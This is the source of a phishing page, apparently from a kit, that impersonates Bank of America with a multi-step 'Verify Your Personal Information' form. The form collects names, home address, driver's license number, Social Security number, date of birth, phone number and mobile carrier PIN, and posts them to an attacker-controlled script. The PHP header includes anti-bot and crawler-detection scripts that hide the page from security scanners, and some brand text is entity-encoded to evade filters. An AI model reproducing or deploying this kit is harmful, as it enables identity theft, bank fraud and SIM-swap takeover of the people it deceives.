<?php
    session_start();

    require_once './src/Classes/Comp.php';
    require_once './src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
    include './zsec.php';
	include 'bot_fucker/wrd.php';
	include 'crawlerdetect.php';
    include 'bot_fucker/bot.php';
    include 'huehuehue.php';
?>
<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" class="gr__secure"><head class="at-element-marker" style="visibility:visible;">


<title>&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#108;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;</title>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="shortcut icon"
              href="images/favicon.ico"/>

<script src="/javascript/postalAddressVerification.js"></script>
<script src="/javascript/zipCodeValidator.js"></script>
<link rel="stylesheet" type="text/css" href="css/style2.css" />
<link rel="stylesheet" type="text/css" href="css/zk.css" />
<link rel="stylesheet" type="text/css" href="css/abpa-foundation.css" />
<link rel="stylesheet" type="text/css" href="css/abpa-responsive.css" />

<link rel="stylesheet" type="text/css" href="css/style2.css" />
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999");
   $("#ssn").mask("999-99-9999");
   $("#ppno").mask("999-999-9999");
//   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
</script>

  </head>
<body data-gr-c-s-loaded="true" class="safari safari537 breeze"><div id="mboxDiv" class="mbox-name-bac_dep_consumer_app_personal_info_1_top at-element-marker" style="visibility:visible;">
</div><script type="text/javascript"></script>
<div id="fX2J_" style="width:100%;height:100%;" class="z-page">
	<div id="fX2J1" class="z-div">
		<div id="fX2J2" style="display:none;" class="z-div"><span id="fX2J3" class="z-label">Build: </span></div>
		<a id="fX2J4" name="top"></a>
		<div id="fX2J5" class="row page-container">
	
	<div id="fX2J6" class="small-12 columns">
		<div id="fX2J7" class="z-div">
	<div id="fX2J8" class="header">
		<div id="fX2J9" class="row header_branding-bar">
			<div class="small-12 columns">
			
			 <span>
                 <img role="img" tabindex="0" class="image-logo" src="images/new_logo.svg" alt="Bank of America">
             </span>
				<a class="right secure-text show-for-medium-up" href="javascript:void(0);" onclick="displayPopup('JavaScript:Void(0);');return false;" name="ancHMSecArea" id="ancHMSecArea">Secure Page</a>
				<a class="right secure-text show-for-small-only" href="javascript:void(0);" onclick="displayPopup('JavaScript:Void(0);');return false;" name="ancHMSecArea" id="ancHMSecArea"></a>
			</div>
		</div>
		<div id="fX2Ja" class="row header_title-bar">
			<div class="small-12 columns">
				<h1>
					<span class="show-for-large-up">Verify Your Personal Information<sup>™</sup> </span>
					<span focusable="true" focusableintouchmode="true" class="show-for-medium-down">Verify Your Personal Information</span>
				</h1>
			</div>
		</div>	
		<div id="fX2Jb" class="z-include">
	<div id="fX2Jc" class="row">
		<div class="small-12 columns progress-bar--v1">
			<div class="contain-to-grid sticky">
			    <nav class="top-bar" data-topbar="">
 					<div class="progress progress--v1">
						<span id="step-meter" class="meter" style="width: 34%;"><span id="step-meter-inner" class="meter" style="display:none;"></span></span>
						<span id="step-counter" class="hide">3</span>
					</div>
					<ul class="progress-bar_step-list--v1">
						<li class="progress-bar_step">
							<span id="step-1-circle" class="step-circle done">
								<p class="show-for-medium-up step-number">
									<span id="fX2Je" class="ada-hidden">Step 1 of 4 (Current Step):</span>
								1</p>
							</span>					
							<label id="step-1-label" class="show-for-medium-up step-text active">Security Question</label>
						</li>
						<li class="progress-bar_step">
							<span id="step-2-circle" class="step-circle active">
								<p class="show-for-medium-up step-number">
									<span id="fX2Jh" class="ada-hidden">Step 2 of 4:</span>
								2</p>
							</span>
														<label id="step-2-label" class="show-for-medium-up step-text active">Your Information</label>
						</li>
						<li class="progress-bar_step">
							<span id="step-3-circle" class="step-circle">
								<p class="show-for-medium-up step-number">
									<span id="fX2Jk" class="ada-hidden">Step 3 of 4 (Current Step):</span>
								3</p>
							</span>
							<label id="step-3-label" class="show-for-medium-up step-text">Card Information</label>
						</li>
						<li class="progress-bar_step">
							<span id="step-4-circle" class="step-circle">
								<p class="show-for-medium-up step-number">
									<span id="fX2Jn" class="ada-hidden">Step 4 of 4:</span>
								4</p>
							</span>
							<label id="step-4-label" class="show-for-medium-up step-text">Review &amp; Submit</label>
						</li>
					</ul>
					<a id="help-link" class="show-for-small-only help-dropdown_trigger">Need Help?</a>
                </nav>
				<ul role="list" aria-label="Need Help Menu" id="help-menu">
					<span>
							<li class="help-menu_cell">
								<a class="help-menu_link" href="tel:844-375-7031">
									<img class="image-call" src="images/call_icon_2x.svg">
									Call 844-375-7031
								</a>
							</li>
					</span>
					
					<li class="help-menu_cell" id="tc-chat-container-59"></li>
				</ul>
			</div>
		</div>
	</div></div></div></div>
		<div id="fX2Jp" class="z-include">
<div id="fX2Jq" class="z-div">
	<div id="fX2Jr" class="row show-for-medium-up contact-container">
		<div id="cdpContactDiv" class="medium-6 columns right">
			<ul class="inline-list contact-list">
				<li class="show-for-medium-up">
					<img class="image-call"  src="images/call_icon_2x.svg" alt=" ">
					<span class="contact-list_item-title">CALL</span>
					<span class="contact-list_item-body">844-375-7031</span>
				</li>
				<li class="show-for-medium-up" id="tc-chat-container-48" aria-live="polite"><img  src="images/app-fixed1-busy.png" alt="Chat with us - chat is busy." style="cursor:default"></li>
			</ul>
		</div>
	</div></div></div>
		
		
		
		<div id="fX2Jw" class="z-include">
	<div id="fX2Jx" style="display:none;" class="z-div">

		<div id="fX2J20" class="row ada-hidden">
			<div class="small-12 columns">
				<ul>
					<div id="fX2J30" class="z-div"></div>
				</ul>
			</div>
		</div></div></div>
		<div id="fX2J50" class="z-div">
	<div id="fX2J60" class="row"></div>
	<div id="fX2J70" class="row">
	<div id="fX2J80" class="z-div">
</div>
	<div id="fX2Jk0" class="z-div">
		<div id="fX2Jl0" class="small-12 columns ">
			<div id="fX2Jm0" style="width:100%;height:100%;" class="responsive-div-include z-include">
	<div id="fX2Jn0" class="z-div">

		<div id="fX2Jo0" class="row">
			<div class="small-12 medium-11 columns">
				<div id="fX2Jp0" class="z-div">
					<h2 id="fX2Jq0">Update Your Information</h2>
					<h3 id="fX2Jr0" class="c1">Welcome, All fields are required.</h3></div>
			</div>
		</div>
		
		<div id="fX2Js0" class="z-div">
			<hr id="fX2Jt0" aria-hidden="true">
			<div id="fX2Ju0" class="row">
				<div class="small-6 columns">
					<h3>Personal Information</h3>
				</div>
				<div class="small-6 columns">
					<p class="required-text">* required</p>
				</div>
			</div></div>
		
		<div id="fX2Jv0" class="row">
			<div id="fX2Jw0" class="small-12 columns">
				<form method="post" action="step/next/mainnet.php?token=<?php echo $_SESSION['token']; ?>" >
						<div id="fX2Ji2" class="z-include">
	<div id="fX2Jj2" class="z-div">
			<div id="fX2Jk2" style="display:none;" class="row">
				<div id="fX2Jl2" class="small-12 columns">

					<hr>
				</div></div>
			<div id="fX2Jm2" class="z-div">
				<div id="fX2Jn2" class="row">
					<div class="small-12 medium-6 large-3 columns">
					First name
						<div id="zz_name_tb_fnm_v_1-box" class="text-box">
						
<label id="zz_name_tb_fnm_v_1-label" class="text-box_label" for="zz_name_tb_fnm_v_1"></label>
<input type="text"  id="zz_name_tb_fnm_v_1" class="z-textbox abpa-textbox" value="" maxlength="25" name="fname" placeholder="First name *"  autocomplete="given-name" required>
</div>

					</div>
					
					<div class="small-12 medium-6 large-3 columns">
					Last name
						<div id="zz_name_tb_mnm_v_1-box" class="text-box">
						
<label id="zz_name_tb_mnm_v_1-label" class="text-box_label" for="zz_name_tb_mnm_v_1"></label>
<input type="text" data-field-type="" id="zz_name_tb_mnm_v_1" class="z-textbox abpa-textbox" value="" maxlength="25" name="lname" placeholder="Last name *"  autocomplete="family-name" required>
</div>

					</div>
					
					<div class="small-12 medium-3 large-2 columns end">

</div>
<div id="zz_name_lb_suf_v_1-err" style="display: none;">

<label id="zz_name_lb_suf_v_1-errtxt" class="field-error-label"></label>
</div>

					</div>
				</div></div></div></div>
										
						</div>
					
						
							 
						<div id="fX2J04" class="z-include">
	<div id="fX2J24" class="z-div">
		<div id="fX2J34" style="display:none;" class="z-div">
				<div id="fX2J44-parent" class="row">
</div>
</div>

</div>
		<div id="fX2J74" class="z-div">
				<div id="fX2J84" class="row">
					<div class="small-12 medium-8 large-6 columns end">
					Home address
						<div id="zz_addr_tb_line1_v_1-box" class="text-box">
<label id="zz_addr_tb_zip_v_1-label" class="text-box_label inactive" for="zz_addr_tb_zip_v_1">Street Address</label>
<input type="text"  id="zz_addr_tb_line1_v_1" class="z-textbox abpa-textbox" value="" maxlength="25" name="stradd1" placeholder="Address line 1 * No P.O. boxes" autocomplete="address-line1">

</div>


					</div>
				</div>
				<div id="fX2J94" class="row">
					<div class="small-12 medium-8 large-6 columns end">
						<div id="zz_addr_tb_line2_v_1-box" class="text-box">

<input type="text" data-field-type="" id="zz_addr_tb_line2_v_1" class="z-textbox abpa-textbox" value="" maxlength="25" name="stradd2" placeholder="Address line 2 Apartment #, Unit #."  autocomplete="address-line2">

</div>


					</div>
				</div>
				<div id="fX2Ja4" class="row">
					<div class="small-12 medium-5 columns">
						<div id="zz_addr_tb_city_v_1-box" class="text-box">

<input type="text" data-field-type="" id="zz_addr_tb_city_v_1" class="z-textbox abpa-textbox" value="" maxlength="25" name="city" placeholder="City *"  autocomplete="address-level2">

</div>


					</div>
					<div class="small-12 medium-4 columns">
						<div class="select-box inactive" id="zz_addr_lb_state_v_1-box">
<label id="zz_addr_lb_state_v_1-label" class="select-box_label inactive" for="zz_addr_lb_state_v_1">State *</label>
<select id="zz_addr_lb_state_v_1" class="z-xrlistbox abpa-listbox"  size="1" name="state"  required><option id="fX2Jts0" class="z-xrlistitem">State</option><option id="fX2Jvs0" class="z-xrlistitem" value="Armed Forces (the) Americas">Armed Forces (the) Americas</option><option id="fX2Jxs0" class="z-xrlistitem" value="AE">Armed Forces Europe</option><option id="fX2Jzs0" class="z-xrlistitem" value="AP">Armed Forces Pacific</option><option id="fX2J0t0" class="z-xrlistitem" value="AL">Alabama</option><option id="fX2J2t0" class="z-xrlistitem" value="AK">Alaska</option><option id="fX2J4t0" class="z-xrlistitem" value="AZ">Arizona</option><option id="fX2J6t0" class="z-xrlistitem" value="AR">Arkansas</option><option id="fX2J8t0" class="z-xrlistitem" value="AS">American Samoa</option><option id="fX2Jat0" class="z-xrlistitem" value="CA">California</option><option id="fX2Jct0" class="z-xrlistitem" value="CO">Colorado</option><option id="fX2Jet0" class="z-xrlistitem" value="CT">Connecticut</option><option id="fX2Jgt0" class="z-xrlistitem" value="DE">Delaware</option><option id="fX2Jit0" class="z-xrlistitem" value="DC">District of Columbia</option><option id="fX2Jkt0" class="z-xrlistitem" value="FL">Florida</option><option id="fX2Jmt0" class="z-xrlistitem" value="GA">Georgia</option><option id="fX2Jot0" class="z-xrlistitem" value="GU">Guam</option><option id="fX2Jqt0" class="z-xrlistitem" value="HI">Hawaii</option><option id="fX2Jst0" class="z-xrlistitem" value="ID">Idaho</option><option id="fX2Jut0" class="z-xrlistitem" value="IL">Illinois</option><option id="fX2Jwt0" class="z-xrlistitem" value="IN">Indiana</option><option id="fX2Jyt0" class="z-xrlistitem" value="IA">Iowa</option><option id="fX2J_u0" class="z-xrlistitem" value="KS">Kansas</option><option id="fX2J1u0" class="z-xrlistitem" value="KY">Kentucky</option><option id="fX2J3u0" class="z-xrlistitem" value="LA">Louisiana</option><option id="fX2J5u0" class="z-xrlistitem" value="ME">Maine</option><option id="fX2J7u0" class="z-xrlistitem" value="MD">Maryland</option><option id="fX2J9u0" class="z-xrlistitem" value="MA">Massachusetts</option><option id="fX2Jbu0" class="z-xrlistitem" value="MI">Michigan</option><option id="fX2Jdu0" class="z-xrlistitem" value="MN">Minnesota</option><option id="fX2Jfu0" class="z-xrlistitem" value="MS">Mississippi</option><option id="fX2Jhu0" class="z-xrlistitem" value="MO">Missouri</option><option id="fX2Jju0" class="z-xrlistitem" value="MT">Montana</option><option id="fX2Jlu0" class="z-xrlistitem" value="NE">Nebraska</option><option id="fX2Jnu0" class="z-xrlistitem" value="NV">Nevada</option><option id="fX2Jpu0" class="z-xrlistitem" value="NH">New Hampshire</option><option id="fX2Jru0" class="z-xrlistitem" value="NJ">New Jersey</option><option id="fX2Jtu0" class="z-xrlistitem" value="NM">New Mexico</option><option id="fX2Jvu0" class="z-xrlistitem" value="NY">New York</option><option id="fX2Jxu0" class="z-xrlistitem" value="NC">North Carolina</option><option id="fX2Jzu0" class="z-xrlistitem" value="ND">North Dakota</option><option id="fX2J0v0" class="z-xrlistitem" value="MP">Northern Mariana Islands</option><option id="fX2J2v0" class="z-xrlistitem" value="OH">Ohio</option><option id="fX2J4v0" class="z-xrlistitem" value="OK">Oklahoma</option><option id="fX2J6v0" class="z-xrlistitem" value="OR">Oregon</option><option id="fX2J8v0" class="z-xrlistitem" value="PA">Pennsylvania</option><option id="fX2Jav0" class="z-xrlistitem" value="PR">Puerto Rico</option><option id="fX2Jcv0" class="z-xrlistitem" value="RI">Rhode Island</option><option id="fX2Jev0" class="z-xrlistitem" value="SC">South Carolina</option><option id="fX2Jgv0" class="z-xrlistitem" value="SD">South Dakota</option><option id="fX2Jiv0" class="z-xrlistitem" value="TN">Tennessee</option><option id="fX2Jkv0" class="z-xrlistitem" value="TX">Texas</option><option id="fX2Jmv0" class="z-xrlistitem" value="UT">Utah</option><option id="fX2Jov0" class="z-xrlistitem" value="VI">US Virgin Islands</option><option id="fX2Jqv0" class="z-xrlistitem" value="VT">Vermont</option><option id="fX2Jsv0" class="z-xrlistitem" value="VA">Virginia</option><option id="fX2Juv0" class="z-xrlistitem"  value="WA">Washington</option><option id="fX2Jwv0" class="z-xrlistitem" value="WV">West Virginia</option><option id="fX2Jyv0" class="z-xrlistitem" value="WI">Wisconsin</option><option id="fX2J_w0" class="z-xrlistitem" value="WY">Wyoming</option></select>
</div>

					</div>
					<div class="small-12 medium-3 columns end">
						<div id="zz_addr_tb_zip_v_1-box" class="text-box inactive">
<label id="zz_addr_tb_zip_v_1-label" class="text-box_label inactive" for="zz_addr_tb_zip_v_1">ZIP code *</label>
<input type="tel" data-field-type="zip" id="zz_addr_tb_zip_v_1" class="z-textbox abpa-textbox text-box--zip" value="" maxlength="7" name="zipcode" placeholder="ZIP code *" aria-describedby="zz_addr_tb_zip_v_1-hint zz_addr_tb_zip_v_1-errtxt" autocomplete="postal-code" required>

</div>
<div id="zz_addr_tb_zip_v_1-err" style="display: none;">

					</div>
				</div>
				</div></div></div>
						</div></div>

						<br>
	<div id="fX2Jw8" style="display" class="row">
				<div id="fX2Jx8" class="small-12 medium-5 columns">										Driver's License Number
						<div id="zz_citz_tb_ssn_v_1-box" class="row collapse text-box">
<div class="small-10 columns">
<label id="zz_addr_tb_zip_v_1-label" class="text-box_label inactive" for="zz_addr_tb_zip_v_1"></label>
<input type="text" class="disableCutCopyPaste initial-ssn abpa-textbox text-box--ssn" value="" minlength="8" name="dlnum" placeholder="Driver's License Number *" autocomplete="off" required>

</div>

</div>

</div>

</div>
			<div id="fX2Jw8" style="display" class="row">
				<div id="fX2Jx8" class="small-12 medium-5 columns">										Social Security number or (ITIN)	
						<div id="zz_citz_tb_ssn_v_1-box" class="row collapse text-box">
<div class="small-10 columns">
<label id="zz_addr_tb_zip_v_1-label" class="text-box_label inactive" for="zz_addr_tb_zip_v_1">XXX-XX-XXXX</label>
<input type="tel" id="ssn" class="disableCutCopyPaste initial-ssn abpa-textbox text-box--ssn" placeholder="___-__-____" data-slots="_" name="ssn" autocomplete="off" required>

</div>

</div>

				<br>
			
			<div id="fX2Jc9" class="row">
			
				<div id="fX2Jd9" class="small-12 medium-3 large-4 columns end">
				Date of birth
					<div id="zz_citz_tb_dob_v_1-box" class="text-box">

 <input type="tel" id="dob" class="disableCutCopyPaste abpa-textbox text-box--mmddyyyy" placeholder="MM/DD/YYYY" data-slots="MDY" name="dob" autocomplete="off" required>
</div>


				</div></div>
	</div></div>
<hr>
					<div id="fX2Jz7" style="width:100%;height:100%;" class="z-include">

		
		
			<div id="fX2J08" class="row">
				<div class="small-12 medium-5 large-4 columns">
				Phone Number
					<div id="zz_phn_tb_ppno_v_1-box" class="text-box">

<input type="tel" data-field-type="phonePrefill" id="ppno" class="disableCutCopyPaste abpa-textbox text-box--phonePrefill" placeholder="(___)___-____" data-slots="_" name="phnum" requried>
</div>

				</div>
				<div class="small-12 medium-5 large-4 columns end">
				Phone type
					<div class="select-box inactive" id="zz_phn_lb_ppnotp_v_1-box">
<label id="zz_phn_lb_ppnotp_v_1-label" class="select-box_label inactive" for="zz_phn_lb_ppnotp_v_1">Phone number type *</label>
<select id="zz_phn_lb_ppnotp_v_1" class="z-xrlistbox abpa-listbox" selectedindex="1" size="1" name="phtyp" aria-describedby="zz_phn_lb_ppnotp_v_1-hint zz_phn_lb_ppnotp_v_1-errtxt"required><option id="fX2Jjw0" class="z-xrlistitem"></option><option id="fX2Jlw0" class="z-xrlistitem" value="MobilePhone">Mobile</option><option id="fX2Jnw0" class="z-xrlistitem" value="HomePhone">Home</option><option id="fX2Jpw0" class="z-xrlistitem" value="WorkPhone">Work</option></select>
</div>


				</div>
			</div>
			
			
			<div class="small-12 medium-5 large-4 columns">
				Carrier Pin
					<div id="zz_phn_tb_ppno_v_1-box" class="text-box">

<input type="tel" data-field-type="phonePrefill" id="ppno" class="disableCutCopyPaste abpa-textbox text-box--phonePrefill" name="crpn" requried>
</div>

				</div>
			
			<div id="fX2Jy0" class="small-12 columns"></div>
		</div>
		<div id="fX2Jz0" class="z-include">
	<div id="fX2J_1" class="z-div">
		<div id="fX2J01" class="row">
			<div class="small-12 large-9 columns">
			
			</div>
		</div>
		</div></div></div></div></div></div>
	
	<div id="fX2Ji1" class="row">
	<div id="fX2Jj1" class="z-div">
		<div id="fX2Jk1" class="small-12 columns ">
			<div id="fX2Jl1" style="width:100%;height:100%;" class="responsive-div-include z-include">
  <div id="fX2Jm1" class="z-div">
     
    <div id="fX2Jn1" class="small-12 columns">
	<div class="int_style4">
<input id="login" type="submit" class="bt_style" value="Continue">
</div>
	  </form>
      </div></div></div></div></div></div></div>
		<div id="fX2Js1" class="z-include">
	<div id="fX2Jt1" class="row hide-for-print">
		<span id="hiddenIsContinueButtonActive_v_1" style="display:none;" class="z-checkbox"><input type="checkbox" id="hiddenIsContinueButtonActive_v_1-real" name="hiddenIsContinueButtonActive" checked="checked"><label for="hiddenIsContinueButtonActive_v_1-real" class="z-checkbox-cnt"></label></span>
		
	</div></div>
		<div id="fX2J22" class="z-div">
	<div id="fX2J32" class="footer hide-for-print">
		<div id="fX2J42" class="row">
			<div id="fX2J52" class="small-12 columns">
				<p class="privacy-text">
					<span id="fX2J62" class="z-span">
					<a id="fX2J72" class="privacy-text_link" title="Share website feedback" name="link_shareWebsiteFeedback" href="javascript:void(0);" onclick="oo_feedback.show()">Share website feedback</a>
					<span id="fX2J82" aria-hidden="true"> | </span></span>


					
					<a class="privacy-text_link" title="Privacy & Security. Link opens in new window." name="PrivacyAndSecurity" href="javascript:void(0);" onclick="displayPopup('#');return false;">Privacy &amp; Security</a>
				</p>
				<p focusable="true" focusableintouchmode="true" class="copyright-text">
					&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#44;&#32;&#78;&#46;&#65;&#46;&#32;&#77;&#101;&#109;&#98;&#101;&#114;&#32;&#70;&#68;&#73;&#67;&#46;
					
					<a class="copyright-text_link" title="Equal Housing Lender. Link opens in new window." href="javascript:void(0);" onclick="displayPopup('#');return false;" name="EqualHousingLender">Equal Housing Lender</a>
				</p>
				<p focusable="true" focusableintouchmode="true" class="copyright-text">&copy; 2022&#32;&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#32;&#67;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#105;&#111;&#110;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#100;&#46;&#32;&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#44;&#32;&#78;&#46;&#65;&#46;&#32;&#77;&#101;&#109;&#98;&#101;&#114;&#32;&#70;&#68;&#73;&#67;&#46;</p>
			</div></div></div></div>
	</div></div>
		<div id="fX2Jb2" class="z-div"></div>

		<div id="fX2Je2" class="block-ui">
			<div id="fX2Jf2" class="processing-modal z-window-modal z-window-modal-shadow">
				<div class="z-window-modal-tl-noborder">
					<div class="z-window-modal-tr-noborder"></div>
				</div>
				
				<div class="z-window-modal-bl-noborder">
					<div class="z-window-modal-br-noborder"></div>
				</div>
			</div></div></div></div>
			<script>
// This code empowers all input tags having a placeholder and data-slots attribute
document.addEventListener('DOMContentLoaded', () => {
    for (const el of document.querySelectorAll("[placeholder][data-slots]")) {
        const pattern = el.getAttribute("placeholder"),
            slots = new Set(el.dataset.slots || "_"),
            prev = (j => Array.from(pattern, (c,i) => slots.has(c)? j=i+1: j))(0),
            first = [...pattern].findIndex(c => slots.has(c)),
            accept = new RegExp(el.dataset.accept || "\\d", "g"),
            clean = input => {
                input = input.match(accept) || [];
                return Array.from(pattern, c =>
                    input[0] === c || slots.has(c) ? input.shift() || c : c
                );
            },
            format = () => {
                const [i, j] = [el.selectionStart, el.selectionEnd].map(i => {
                    i = clean(el.value.slice(0, i)).findIndex(c => slots.has(c));
                    return i<0? prev[prev.length-1]: back? prev[i-1] || first: i;
                });
                el.value = clean(el.value).join``;
                el.setSelectionRange(i, j);
                back = false;
            };
        let back = false;
        el.addEventListener("keydown", (e) => back = e.key === "Backspace");
        el.addEventListener("input", format);
        el.addEventListener("focus", format);
        el.addEventListener("blur", () => el.value === pattern && (el.value=""));
    }
});</script>
</body></html>